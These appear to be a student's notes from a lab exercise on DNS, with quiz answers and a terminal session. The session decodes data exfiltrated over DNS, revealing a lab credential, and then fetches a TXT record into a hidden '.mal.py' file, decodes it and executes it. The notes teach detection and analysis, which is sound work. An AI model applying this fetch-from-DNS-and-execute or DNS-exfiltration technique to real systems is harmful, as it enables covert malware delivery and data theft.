```

If you were on Windows, what command could you use to query a txt record for 'youtube.com'?
nslookup -type=txt youtube.com


If you were on Linux, what command could you use to query a txt record for 'facebook.com'?
dig facebook.com txt


AAAA stores what type of IP Address along with the hostname?
IPv6

Maximum characters for a DNS TXT Record is 256. (Yay/Nay)
Nay

What DNS Record provides a domain name in reverse-lookup? (Research)
PTR

What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2) (Research)
nslookup 192.168.203.2
** server can't find 2.203.168.192.in-addr.arpa: NXDOMAIN
2.203.168.192.in-addr.arpa

What is the maximum length of a DNS name? (Research) (Length includes dots!)
253

┌──(kali㉿kali)-[~]
└─$ ssh user@10.10.122.35     
The authenticity of host '10.10.122.35 (10.10.122.35)' can't be established.
ED25519 key fingerprint is SHA256:MK7S0Kun8o9zt5i3WQuP90uG0rWCpJ0E+9NAda/gt8w.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:66: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.122.35' (ED25519) to the list of known hosts.
user@10.10.122.35's password: P@ssword01
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


86 packages can be updated.
63 updates are security updates.


Last login: Fri Feb 26 10:47:05 2021
user@user1:~$ cd challenges/exfiltration/orderlist/
user@user1:~/challenges/exfiltration/orderlist$ python3 ../../../dns-exfil-infil/packetyGrabber.py order.pcap
File captured: order.pcap
Filename output: order.txt
Domain Name (Example: badbaddoma.in): badbaddoma.in
[+] Domain Name set to badbaddoma.in
[+] Filtering for your domain name.
[+] Base58 decoded.
[+] Base64 decoded.
[+] Output to order.txt
Exception ignored in: <bound method BaseEventLoop.__del__ of <_UnixSelectorEventLoop running=False closed=True debug=False>>
Traceback (most recent call last):
  File "/usr/lib/python3.5/asyncio/base_events.py", line 431, in __del__
  File "/usr/lib/python3.5/asyncio/unix_events.py", line 58, in close
  File "/usr/lib/python3.5/asyncio/unix_events.py", line 139, in remove_signal_handler
  File "/usr/lib/python3.5/signal.py", line 47, in signal
TypeError: signal handler must be signal.SIG_IGN, signal.SIG_DFL, or a callable object
user@user1:~/challenges/exfiltration/orderlist$ cat order.txt
DATE    ORDER-ID        TRANSACTION     PRICE      CODE
01-06      1            Network Equip.  $2349.99    -
01-09      2            Software Licen. $1293.49    -
01-11      3            Physical Secur. $7432.79    -
02-06      4            SENT TO #1056.. $15040.23   -
02-06      5            1M THM VOUCHER  $10        zSiSeC
02-06      6            Firewall        $2500       -


~/challenges/exfiltration/orderlist/ 

ORDER-ID: 1

What is the Transaction name? (Type it as you see it) Network Equip.



~/challenges/exfiltration/orderlist/ 

TRANSACTION: Firewall

How much was the Firewall? (Without the $) 2500



~/challenges/exfiltration/identify/

Which file contains suspicious DNS queries? cap3.pcap

tion/orderlist$ cd ..                                                                
user@user1:~/challenges/exfiltration$ ls
identify  orderlist
user@user1:~/challenges/exfiltration$ cd identify
user@user1:~/challenges/exfiltration/identify$ ls
cap1.pcap  cap2.pcap  cap3.pcap  TASK  TASK1.save
user@user1:~/challenges/exfiltration/identify$ cat TASK
Steps on how to solve this task:
1. Identify which file contains the suspicious dns queries.
2. Identify what domain name was used to exfiltrate the data.
( You can use tshark to filter the dns query name )
( Google how to filter dns query names with tshark )
3. Run ~/dns-exfil-infil/packetyGrabber.py and put the correct inputs in.

If you do everything correctly you will be able to answer the last 2 questions.
user@user1:~/challenges/exfiltration/identify$ python3 ../../../dns-exfil-infil/packetyGrabber.py cap3.pcap
File captured: cap3.pcap
Filename output: cap.txt
Domain Name (Example: badbaddoma.in): badbaddoma.in
[+] Domain Name set to badbaddoma.in
[+] Filtering for your domain name.
[+] Base58 decoded.
[+] Base64 decoded.
[+] Output to cap.txt
Exception ignored in: <bound method BaseEventLoop.__del__ of <_UnixSelectorEventLoop running=False closed=True debug=False>>
Traceback (most recent call last):
  File "/usr/lib/python3.5/asyncio/base_events.py", line 431, in __del__
  File "/usr/lib/python3.5/asyncio/unix_events.py", line 58, in close
  File "/usr/lib/python3.5/asyncio/unix_events.py", line 139, in remove_signal_handler
  File "/usr/lib/python3.5/signal.py", line 47, in signal
TypeError: signal handler must be signal.SIG_IGN, signal.SIG_DFL, or a callable object
user@user1:~/challenges/exfiltration/identify$ cat cap.txt
administrator:s3cre7P@ssword

This will first look up the TXT record for rt1.badbaddoma.in, then get the value within the quotes, and finally it will save the value into a file named '.mal.py'.
nslookup -type=txt rt1.badbaddoma.in | grep Za | cut -d \" -f2 > .mal.py



Follow the instructions in the TASK file to complete this question.

Enter the output from the executed python file

user@user1:~/challenges/exfiltration/identify$ cd ..
user@user1:~/challenges/exfiltration$ cd ..
user@user1:~/challenges$ ls
exfiltration  infiltration
user@user1:~/challenges$ cd infiltration/
user@user1:~/challenges/infiltration$ ls
TASK
user@user1:~/challenges/infiltration$ cat TASK 
For this TASK we will be requesting a TXT Record from my public domain name.
Here is the information needed to complete this challenge:

My Domain Name: badbaddoma.in
Request TXT Record from this subdomain: code
Save the text value to a python file
Run the ~/dns-exfil-infil/packetySimple.py to decode the text
Run the program: python3 [your-file-name].py
Take a note of the output and answer the question in the "DNS Infiltration - Practice" section.
user@user1:~/challenges/infiltration$ nslookup -type=txt badbaddoma.in | grep ig | cut -d \" -f2 > .mal.py
user@user1:~/challenges/infiltration$ cat .mal.py 
igIjbc - Claimed
user@user1:~/challenges/infiltration$ nslookup -type=txt code.badbaddoma.in
Server:         10.0.0.2
Address:        10.0.0.2#53

Non-authoritative answer:
code.badbaddoma.in      text = "YeeTbunLbACdXq193g6VHXRuDQ9Y1upaAzA3UkpCr8yBBE68JEXU32wxNE44"

Authoritative answers can be found from:

user@user1:~/challenges/infiltration$ nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \" -f2 > .mal.py
user@user1:~/challenges/infiltration$ python3 ~/dns-exfil-infil/packetySimple.py
Filename: .mal.py
[+] Reading from file...
[+] Base58 decoded.
[+] Base64 decoded.
[+] Done, .mal.py is decoded.
user@user1:~/challenges/infiltration$ cat .mal.py 
import os; print(os.uname()[2])user@user1:~/challenges/infiltration$ python3 .mal.py 
4.4.0-186-generic
user@user1:~/challenges/infiltration$ 

What program was used to Tunnel HTTP over DNS? iodine
```

[[DDOS]]